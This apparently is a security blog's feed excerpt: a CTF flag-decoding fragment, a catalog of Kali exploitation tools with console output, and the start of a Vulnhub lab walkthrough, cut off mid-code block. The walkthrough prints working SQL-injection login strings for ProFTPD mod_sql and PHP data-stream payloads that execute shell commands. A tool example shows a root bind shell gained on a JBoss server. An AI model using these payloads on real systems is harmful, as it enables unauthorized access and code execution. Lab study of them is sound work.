</span><span class='line'>(102, 'Sasha Grey', 'Vatican City', 'Active'),
</span><span class='line'>(101, 'Andres Bonifacio', 'Tondo, Manila', 'Active'),
</span><span class='line'>(103, 'lol', 'what the???', 'Inactive'),
</span><span class='line'>(104, '\\u0069\\u006e\\u0066\\u006f\\u0073\\u0065\\u0063\\u005f\\u0066\\u006c\\u0061\\u0067\\u0069\\u0073\\u005f\\u0077\\u0068\\u0061\\u0074\\u0073\\u006f\\u0072\\u0063\\u0065\\u0072\\u0079\\u0069\\u0073\\u0074\\u0068\\u0069\\u0073', 'annoying', '0x0a');</span></code></pre></td></tr></table></div></figure>


<p>Used <a href="http://ddecode.com/hexdecoder/">this decoder</a> to decode the not-at-all conspicuous string and: <code>infosec_flagis_whatsorceryisthis</code> ! :D</p>

<h3>Level 15</h3>

<p>Something seems wrong with the server and I get a (real) 404 error for this level only. When it works again I will update this section</p>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/cookie.png" title="cookie" alt="cookie"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Exploitation Tools]]></title>
    <link href="http://chousensha.github.io/blog/2015/06/01/kali-tools-catalog-exploitation-tools/"/>
    <updated>2015-06-01T10:56:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/06/01/kali-tools-catalog-exploitation-tools</id>
    <content type="html"><![CDATA[<h3>BeEF XSS Framework</h3>

<p><strong>beef</strong></p>

<p>BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.</p>

<p>Amid growing concerns about web-borne attacks against clients, including mobile clients, BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. Unlike other security frameworks, BeEF looks past the hardened network perimeter and client system, and examines exploitability within the context of the one open door: the web browser. BeEF will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context.</p>

<!-- more -->


<p><img class="center" src="http://chousensha.github.io/images/kali/exploit/beef.png" title="beef" alt="beef"></p>

<h3>Exploit Database</h3>

<p><strong>searchsploit</strong></p>

<p>Exploit Database Archive Search</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: searchsploit [options] term1 [term2] ... [termN]
</span><span class='line'>Example: searchsploit oracle windows local
</span><span class='line'>
</span><span class='line'>=========
</span><span class='line'> Options 
</span><span class='line'>=========
</span><span class='line'>   -c            Perform case-sensitive searches; by default, searches will
</span><span class='line'>                 try to be greedy
</span><span class='line'>   -h, --help    Show help screen
</span><span class='line'>   -v            By setting verbose output, description lines are allowed to
</span><span class='line'>                 overflow their columns
</span><span class='line'>
</span><span class='line'>=======
</span><span class='line'> NOTES 
</span><span class='line'>=======
</span><span class='line'> * Use any number of search terms you would like (minimum: 1)
</span><span class='line'> * Search terms are not case sensitive, and order is irrelevant</span></code></pre></td></tr></table></div></figure>


<h3>Exploit Development Tools</h3>

<p><strong>edb-debugger</strong></p>

<p>A Linux equivalent of the famous Olly debugger on the Windows platform. Some of its features are:</p>

<ul>
<li><p>Intuitive GUI interface</p></li>
<li><p>The usual debugging operations (step-into/step-over/run/break)</p></li>
<li><p>Conditional breakpoints</p></li>
<li><p>Debugging core is implemented as a plugin so people can have drop in replacements. Of course if a given platform has several debugging APIs available, then you may have a plugin that implements any of them.</p></li>
<li><p>Basic instruction analysis</p></li>
<li><p>View/Dump memory regions</p></li>
<li><p>Effective address inspection</p></li>
<li><p>The data dump view is tabbed, allowing you to have several views of memory open at the same time and quickly switch between them.</p></li>
<li><p>Importing and generation of symbol maps</p></li>
<li><p>Plugins</p></li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/kali/exploit/edb.png" title="edb-debugger" alt="edb"></p>

<p><strong>NASM shell</strong></p>

<p>This tool provides an easy way to see what opcodes are associated with
certain x86 instructions by making use of nasm if it is installed and
reachable through the PATH environment variable.</p>

<p><strong>ollydbg</strong></p>

<p>OllyDbg is a 32-bit assembler level analysing debugger for Microsoft Windows. Emphasis on binary code analysis makes it particularly useful in cases where source is unavailable.</p>

<p>Features:</p>

<ul>
<li><p>Intuitive user interface, no cryptical commands</p></li>
<li><p>Code analysis – traces registers, recognizes procedures, loops, API calls, switches, tables, constants and strings</p></li>
<li><p>Directly loads and debugs DLLs</p></li>
<li><p>Object file scanning – locates routines from object files and libraries</p></li>
<li><p>Allows for user-defined labels, comments and function descriptions</p></li>
<li><p>Understands debugging information in Borland® format</p></li>
<li><p>Saves patches between sessions, writes them back to executable file and updates fixups</p></li>
<li><p>Open architecture – many third-party plugins are available</p></li>
<li><p>No installation – no trash in registry or system directories</p></li>
<li><p>Debugs multithread applications</p></li>
<li><p>Attaches to running programs</p></li>
<li><p>Configurable disassembler, supports both MASM and IDEAL formats</p></li>
<li><p>MMX, 3DNow! and SSE data types and instructions, including Athlon extensions</p></li>
<li><p>Full UNICODE support</p></li>
<li><p>Dynamically recognizes ASCII and UNICODE strings – also in Delphi format!</p></li>
<li><p>Recognizes complex code constructs, like call to jump to procedure</p></li>
<li><p>Decodes calls to more than 1900 standard API and 400 C functions</p></li>
<li><p>Gives context-sensitive help on API functions from external help file</p></li>
<li><p>Sets conditional, logging, memory and hardware breakpoints</p></li>
<li><p>Traces program execution, logs arguments of known functions</p></li>
<li><p>Shows fixups</p></li>
<li><p>Dynamically traces stack frames</p></li>
<li><p>Searches for imprecise commands and masked binary sequences</p></li>
<li><p>Searches whole allocated memory</p></li>
<li><p>Finds references to constant or address range</p></li>
<li><p>Examines and modifies memory, sets breakpoints and pauses program on-the-fly</p></li>
<li><p>Assembles commands into the shortest binary form</p></li>
<li><p>Starts from the floppy disk</p></li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/kali/exploit/ollydbg.png" title="ollydbg" alt="ollydbg"></p>

<p><strong>pattern create</strong></p>

<p>Generate a string composed of unique patterns</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 25
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A</span></code></pre></td></tr></table></div></figure>


<p><strong>pattern offset</strong></p>

<p>Find the offset in an exploit string where your address to overwrite EIP should be</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: pattern_offset.rb &lt;search item&gt; &lt;length of buffer&gt;
</span><span class='line'>Default length of buffer if none is inserted: 8192
</span><span class='line'>This buffer is generated by pattern_create() in the Rex library automatically</span></code></pre></td></tr></table></div></figure>


<h3>Metasploit</h3>

<p>World&rsquo;s most used penetration testing software&hellip;the hacker&rsquo;s best friend. No further description needed</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# msfconsole
</span><span class='line'>[*] Starting the Metasploit Framework console...|
</span><span class='line'>Call trans opt: received. 2-19-98 13:24:18 REC:Loc
</span><span class='line'>
</span><span class='line'>     Trace program: running
</span><span class='line'>
</span><span class='line'>           wake up, Neo...
</span><span class='line'>        the matrix has you
</span><span class='line'>      follow the white rabbit.
</span><span class='line'>
</span><span class='line'>          knock, knock, Neo.
</span><span class='line'>
</span><span class='line'>                        (`.         ,-,
</span><span class='line'>                        ` `.    ,;' /
</span><span class='line'>                         `.  ,'/ .'
</span><span class='line'>                          `. X /.'
</span><span class='line'>                .-;--''--.._` ` (
</span><span class='line'>              .'            /   `
</span><span class='line'>             ,           ` '   Q '
</span><span class='line'>             ,         ,   `._    \
</span><span class='line'>          ,.|         '     `-.;_'
</span><span class='line'>          :  . `  ;    `  ` --,.._;
</span><span class='line'>           ' `    ,   )   .'
</span><span class='line'>              `._ ,  '   /_
</span><span class='line'>                 ; ,''-,;' ``-
</span><span class='line'>                  ``-..__``--`
</span><span class='line'>
</span><span class='line'>                             http://metasploit.pro
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Validate lots of vulnerabilities to demonstrate exposure
</span><span class='line'>with Metasploit Pro -- Learn more on http://rapid7.com/metasploit
</span><span class='line'>
</span><span class='line'>       =[ metasploit v4.11.0-2015013101 [core:4.11.0.pre.2015013101 api:1.0.0]]
</span><span class='line'>+ -- --=[ 1399 exploits - 788 auxiliary - 224 post        ]
</span><span class='line'>+ -- --=[ 356 payloads - 37 encoders - 8 nops             ]
</span><span class='line'>+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
</span><span class='line'>
</span><span class='line'>msf &gt; </span></code></pre></td></tr></table></div></figure>


<h3>Network Exploitation</h3>

<p><strong>armitage</strong></p>

<p>Armitage is a scriptable red team collaboration tool for Metasploit that visualizes targets, recommends exploits, and exposes the advanced post-exploitation features in the framework.</p>

<p>Through one Metasploit instance, your team will:</p>

<ul>
<li><p>Use the same sessions</p></li>
<li><p>Share hosts, captured data, and downloaded files</p></li>
<li><p>Communicate through a shared event log.</p></li>
<li><p>Run bots to automate red team tasks.</p></li>
</ul>


<p>Armitage organizes Metasploit&rsquo;s capabilities around the hacking process. There are features for discovery, access, post-exploitation, and maneuver.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/exploit/armitage.png" title="armitage" alt="armitage"></p>

<p><strong>exploit6</strong></p>

<p>Performs exploits of various CVE known IPv6 vulnerabilities on the destination</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exploit6 v2.5 (c) 2013 by van Hauser / THC &lt;vh@thc.org&gt; www.thc.org
</span><span class='line'>
</span><span class='line'>Syntax: exploit6 interface destination [test-case-number]
</span><span class='line'>
</span><span class='line'>Performs exploits of various CVE known IPv6 vulnerabilities on the destination
</span><span class='line'>Note that for exploitable overflows only 'AAA...' strings are used.
</span><span class='line'>If a system is vulnerable, it will crash, so be careful!</span></code></pre></td></tr></table></div></figure>


<p><strong>ikat</strong></p>

<p>iKAT is designed to provide access to the underlying operating system of a Kiosk terminal by invoking native OS functionality.</p>

<p><strong>jboss-autopwn</strong></p>

<p>This JBoss script deploys a JSP shell on the target JBoss AS server. Once deployed, the script uses its upload and command execution capability to provide an interactive session.</p>

<p>Features include:</p>

<ul>
<li><p>Multiplatform support – tested on Windows, Linux and Mac targets</p></li>
<li><p>Support for bind and reverse bind shells</p></li>
<li><p>Meterpreter shells and VNC support for Windows targets</p></li>
</ul>


<p><a href="https://github.com/SpiderLabs/jboss-autopwn">Example from the homepage</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Linux bind shell:
</span><span class='line'>
</span><span class='line'>[root@nitrogen jboss]# ./e.sh 192.168.1.2 8080 2&gt;/dev/null
</span><span class='line'>[x] Retrieving cookie
</span><span class='line'>[x] Now creating BSH script...
</span><span class='line'>[x] .war file created successfully in /tmp
</span><span class='line'>[x] Now deploying .war file:
</span><span class='line'>http://192.168.1.2:8080/browser/browser/browser.jsp
</span><span class='line'>[x] Running as user...:
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
</span><span class='line'>[x] Server uname...:
</span><span class='line'> Linux nitrogen 2.6.29.6-213.fc11.x86_64 #1 SMP Tue Jul 7 21:02:57 EDT 2009 x86_64 x86_64 x86_64 GNU/Linux
</span><span class='line'>[!] Would you like to upload a reverse or a bind shell? bind
</span><span class='line'>[!] On which port would you like the bindshell to listen on? 31337
</span><span class='line'>[x] Uploading bind shell payload..
</span><span class='line'>[x] Verifying if upload was successful...
</span><span class='line'>-rwxrwxrwx 1 root root 172 2009-11-22 19:48 /tmp/payload
</span><span class='line'>[x] You should have a bind shell on 192.168.1.2:31337..
</span><span class='line'>[x] Dropping you into a shell...
</span><span class='line'>Connection to 192.168.1.2 31337 port [tcp/*] succeeded!
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
</span><span class='line'>python -c 'import pty; pty.spawn("/bin/bash")'
</span><span class='line'>[root@nitrogen /]# full interactive shell :-)</span></code></pre></td></tr></table></div></figure>


<p><strong>termineter</strong></p>

<p>Termineter is a framework written in python to provide a platform for the security testing of smart meters. It implements the C12.18 and C12.19 protocols for communication. Currently supported are Meters using C12.19 with 7-bit character sets. Termineter communicates with Smart Meters via a connection using an ANSI type-2 optical probe with a serial interface.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# termineter
</span><span class='line'>
</span><span class='line'>   ______              _          __         
</span><span class='line'>  /_  __/__ ______ _  (_)__  ___ / /____ ____
</span><span class='line'>   / / / -_) __/  ' \/ / _ \/ -_) __/ -_) __/
</span><span class='line'>  /_/  \__/_/ /_/_/_/_/_//_/\__/\__/\__/_/   
</span><span class='line'>
</span><span class='line'>  &lt;[ termineter                     v0.1.0
</span><span class='line'>  &lt;[ model:                          T-800
</span><span class='line'>  &lt;[ loaded modules:                    12
</span><span class='line'>
</span><span class='line'>termineter &gt; show modules
</span><span class='line'>
</span><span class='line'>Modules
</span><span class='line'>=======
</span><span class='line'>
</span><span class='line'>  Name               Description
</span><span class='line'>  ----               -----------
</span><span class='line'>  brute_force_login  Brute Force Credentials
</span><span class='line'>  dump_tables        Dump Readable C12.19 Tables From The Device To A CSV File
</span><span class='line'>  enum_tables        Enumerate Readable C12.19 Tables From The Device
</span><span class='line'>  get_info           Get Basic Meter Information By Reading Tables
</span><span class='line'>  get_log_info       Get Information About The Meter's Logs
</span><span class='line'>  get_modem_info     Get Information About The Integrated Modem
</span><span class='line'>  get_security_info  Get Information About The Meter's Access Control
</span><span class='line'>  read_table         Read Data From A C12.19 Table
</span><span class='line'>  run_procedure      Initiate A Custom Procedure
</span><span class='line'>  set_meter_id       Set The Meter's I.D.
</span><span class='line'>  set_meter_mode     Change the Meter's Operating Mode
</span><span class='line'>  write_table        Write Data To A C12.19 Table
</span><span class='line'>
</span><span class='line'>termineter &gt; </span></code></pre></td></tr></table></div></figure>


<h3>Social Engineering Toolkit</h3>

<p>The Social-Engineer Toolkit is an open-source penetration testing framework designed for Social-Engineering. SET has a number of custom attack vectors that allow you to make a believable attack in a fraction of the time.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>      _______________________________
</span><span class='line'>     /   _____/\_   _____/\__    ___/
</span><span class='line'>     \_____  \  |    __)_   |    |
</span><span class='line'>     /        \ |        \  |    |
</span><span class='line'>    /_______  //_______  /  |____|
</span><span class='line'>            \/         \/            
</span><span class='line'>
</span><span class='line'>[---]        The Social-Engineer Toolkit (SET)         [---]
</span><span class='line'>[---]        Created by: David Kennedy (ReL1K)         [---]
</span><span class='line'>[---]                  Version: 6.3                    [---]
</span><span class='line'>[---]              Codename: '#HugLife'                [---]
</span><span class='line'>[---]        Follow us on Twitter: @TrustedSec         [---]
</span><span class='line'>[---]        Follow me on Twitter: @HackingDave        [---]
</span><span class='line'>[---]       Homepage: https://www.trustedsec.com       [---]
</span><span class='line'>
</span><span class='line'>    Welcome to the Social-Engineer Toolkit (SET). 
</span><span class='line'>     The one stop shop for all of your SE needs.
</span><span class='line'>
</span><span class='line'> Join us on irc.freenode.net in channel #setoolkit
</span><span class='line'>
</span><span class='line'>   The Social-Engineer Toolkit is a product of TrustedSec.
</span><span class='line'>
</span><span class='line'>         Visit: https://www.trustedsec.com
</span><span class='line'>
</span><span class='line'> Select from the menu:
</span><span class='line'>
</span><span class='line'>   1) Social-Engineering Attacks
</span><span class='line'>   2) Fast-Track Penetration Testing
</span><span class='line'>   3) Third Party Modules
</span><span class='line'>   4) Update the Social-Engineer Toolkit
</span><span class='line'>   5) Update SET configuration
</span><span class='line'>   6) Help, Credits, and About
</span><span class='line'>
</span><span class='line'>  99) Exit the Social-Engineer Toolkit
</span><span class='line'>
</span><span class='line'>set&gt; </span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/kali/exploit/cookie.png" title="cookie" alt="cookie"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Relativity]]></title>
    <link href="http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity/"/>
    <updated>2015-05-10T09:40:50-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity</id>
    <content type="html"><![CDATA[<p>I selected the Relativity VM from Vulnhub as my next home lab target. The objective is to read <code>/root/flag.txt</code>. Let&rsquo;s get started!</p>

<!-- more -->




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> nmap -A -p1-65535 192.168.80.128
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-10 16:46 EEST
</span><span class='line'>Nmap scan report for 192.168.80.128
</span><span class='line'>Host is up (0.00058s latency).
</span><span class='line'>Not shown: 65532 filtered ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>21/tcp open  ftp
</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 42:d0:50:45:6c:4f:6a:25:d9:5e:d4:7d:12:26:04:ef (DSA)
</span><span class='line'>|_  2048 1b:e9:72:2b:8a:0b:57:0a:4b:ad:3d:06:62:94:29:02 (RSA)
</span><span class='line'>80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
</span><span class='line'>|_http-title: M.C. Escher - Relativity
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
</span><span class='line'>SF-Port21-TCP:V=6.47%I=7%D=5/10%Time=554F618E%P=x86_64-unknown-linux-gnu%r
</span><span class='line'>SF:(GenericLines,29,"220\x20Welcome\x20to\x20Relativity\x20FTP\x20\(mod_sq
</span><span class='line'>SF:l\)\r\n");
</span><span class='line'>MAC Address: 00:0C:29:9F:1D:0E (VMware)
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.6.X|3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 2.6.32 - 3.10
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>Service Info: Host: Relativity</span></code></pre></td></tr></table></div></figure>


<p>The web server doesn&rsquo;t seem to serve anything else than an image. I ran Nikto and Dirbuster on it but didn&rsquo;t find anything. Next I hit the FTP server. No anonymous login possible, but there was something interesting in the banner:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>220 Welcome to Relativity FTP (mod_sql)</span></code></pre></td></tr></table></div></figure>


<p>I started googling, and it turns out that <a href="http://www.proftpd.org/docs/contrib/mod_sql.html">&ldquo;The mod_sql module is an authentication and logging module for ProFTPD&rdquo;</a>. The good news is, <a href="https://www.rapid7.com/db/vulnerabilities/ftp-proftpd-sql-injection">there is a SQLi vulnerability</a> in the USER command that might allow access to the server. I don&rsquo;t know the version of our target server, but let&rsquo;s try it!</p>

<p>On <a href="http://www.securityfocus.com/bid/33722/exploit">http://www.securityfocus.com/bid/33722/exploit</a> you can find some sample exploit strings:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --
</span><span class='line'>password: 1
</span><span class='line'>
</span><span class='line'>username: %') and 1=2 union (select &lt;name&gt;,1,&lt;uid&gt;,&lt;gid&gt;,0x2F,0x2F62696E2F62617368); -- a</span></code></pre></td></tr></table></div></figure>


<p>Neither worked, but I tinkered with the comment characters and found out that I could get in either by replacing the <em>&mdash;</em> with a <em>#</em>, or by inserting a space and random characters after the <em>&mdash;</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>220 Welcome to Relativity FTP (mod_sql)
</span><span class='line'>Name (192.168.80.128:root): username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # 
</span><span class='line'>331 Password required for username:.
</span><span class='line'>Password:
</span><span class='line'>230 User username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # logged in.
</span><span class='line'>Remote system type is UNIX.
</span><span class='line'>Using binary mode to transfer files.</span></code></pre></td></tr></table></div></figure>


<p>Next, I found out an interesting looking directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ftp&gt; pwd
</span><span class='line'>257 "/" is current directory.
</span><span class='line'>ftp&gt; dir
</span><span class='line'>200 PORT command successful
</span><span class='line'>150 Opening ASCII mode data connection for file list
</span><span class='line'>drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
</span><span class='line'>-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
</span><span class='line'>-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
</span><span class='line'>226 Transfer complete.</span></code></pre></td></tr></table></div></figure>


<p>It seems we are in the root directory, but the html and image file hint at the web server. So I went to the website again and this time I tried to navigate to that new directory:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/relativity/secretdir.png" title="secretdir" alt="secretdir"></p>

<p>I looked around at the pages, noticed the URL when accessing them looks something like this: <code><a href="http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php">http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php</a></code>. So I tried some local file inclusion, but it didn&rsquo;t get me anywhere. To get to the next step, I needed some external reading and inspiration. For the exploit, we can leverage PHP&rsquo;s <a href="http://php.net/manual/en/wrappers.php">stream wrappers</a>: PHP comes with many built-in wrappers for various URL-style protocols for use with the filesystem functions such as fopen(), copy(), file_exists() and filesize(). On <a href="https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/">this blog post</a> there is a nice explanation and examples of how to get remote code execution by leveraging the <a href="http://php.net/manual/en/wrappers.data.php">data stream</a>. If you look at the examples, you can see that the content passed as a base64 string is being interpreted.
Check page 9 of <a href="https://www.imperva.com/docs/HII_Remote_and_Local_File_Inclusion_Vulnerabilities.pdf">this pdf</a> for a summary of this remote file inclusion technique. Bottom line: we can base64 encode PHP commands and feed them to the target. So to test this out:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># simple RFI
</span><span class='line'>page=data://text/plain, &lt;?php system("whoami");?&gt;
</span><span class='line'>
</span><span class='line'># base64 encoded RFI
</span><span class='line'>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs/Pg==
</span><span class='line'>
